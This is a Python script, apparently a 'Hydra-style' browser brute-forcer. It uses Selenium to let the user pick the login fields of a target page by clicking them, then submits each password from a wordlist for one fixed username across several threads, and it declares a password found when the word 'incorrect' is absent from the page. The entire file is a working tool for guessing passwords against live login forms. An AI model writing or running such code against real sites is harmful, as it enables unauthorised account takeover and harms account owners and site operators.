import argparse
import threading
import time
from queue import Queue

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import keyboard

# CLI ARGUMENTS (HYDRA STYLE)
parser = argparse.ArgumentParser(description="Hydra-style Browser Brute Tester")
parser.add_argument("--u", "--user", dest="username", required=True, help="username to test with")
parser.add_argument("--wordlist", required=True, help="password list file")
parser.add_argument("--threads", type=int, default=5, help="number of threads")
parser.add_argument("--url", required=True, help="login page URL")
args = parser.parse_args()

USERNAME_FIXED = args.username
WORDLIST = args.wordlist
THREADS = args.threads
TARGET_URL = args.url

# LAUNCH SELENIUM
driver = webdriver.Chrome()
driver.get(TARGET_URL)

username_selector = None
password_selector = None
submit_selector = None

print("\n==============================")
print("🔥 BROWSER BRUTE TESTER 🔥")
print("==============================\n")
print(f"Target URL: {TARGET_URL}")
print(f"User: {USERNAME_FIXED}")
print(f"Wordlist: {WORDLIST}")
print(f"Threads: {THREADS}")
print("\n👉 CLICK username field → press S")
print("👉 CLICK password field → press T")
print("👉 Press ENTER to start brute\n")

# Inject JS to track last clicked element
driver.execute_script("""
document.addEventListener('click', function(e) {
    window._lastClicked = e.target;
});
""")

# GENERATE CSS SELECTOR FROM CLICKED ELEMENT
def get_css_selector():
    elem = driver.execute_script("return window._lastClicked")
    if elem is None:
        return None
    return driver.execute_script("""
    function cssPath(el){
        if (!el) return null;
        var path = [];
        while (el.nodeType === Node.ELEMENT_NODE){
            var selector = el.nodeName.toLowerCase();
            if (el.id){
                selector += "#" + el.id;
                path.unshift(selector);
                break;
            } else {
                var sib = el, nth = 1;
                while(sib = sib.previousElementSibling){
                    if (sib.nodeName.toLowerCase() == selector)
                        nth++;
                }
                if (nth != 1)
                    selector += ":nth-of-type("+nth+")";
            }
            path.unshift(selector);
            el = el.parentNode;
        }
        return path.join(" > ");
    }
    return cssPath(arguments[0]);
    """, elem)

# WAIT FOR USER TO LOCK FIELDS
while username_selector is None or password_selector is None:
    if keyboard.is_pressed("s"):
        css = get_css_selector()
        if css:
            username_selector = css
            print(f"🔵 Username selector LOCKED: {css}")
        time.sleep(0.3)
    if keyboard.is_pressed("t"):
        css = get_css_selector()
        if css:
            password_selector = css
            print(f"🟣 Password selector LOCKED: {css}")
        time.sleep(0.3)

print("\nSelectors locked! Press ENTER to launch brute...")
keyboard.wait("enter")

# LOAD WORDLIST
q = Queue()
with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        q.put(line.strip())

found = False

# WORKER FUNCTION
def worker():
    global found
    while not q.empty() and not found:
        pwd = q.get()
        try:
            driver.get(TARGET_URL)
            try:
                u = driver.find_element(By.CSS_SELECTOR, username_selector)
                p = driver.find_element(By.CSS_SELECTOR, password_selector)
                u.clear()
                u.send_keys(USERNAME_FIXED)
                p.clear()
                p.send_keys(pwd)
                p.send_keys(Keys.ENTER)
                print(f"Trying: {USERNAME_FIXED} / {pwd}")
                time.sleep(1)
                if "incorrect" not in driver.page_source.lower():
                    print(f"\n🔥🔥 PASSWORD FOUND: {pwd} 🔥🔥\n")
                    found = True
                    break
            except (NoSuchElementException, WebDriverException) as e:
                print(f"Element/driver error during attempt with '{pwd}': {e}")
        except Exception as e:
            print(f"Navigation or unexpected error: {e}")

# THREAD LAUNCHER
threads = []
try:
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print("\nDone.")
finally:
    try:
        driver.quit()
    except Exception:
        pass
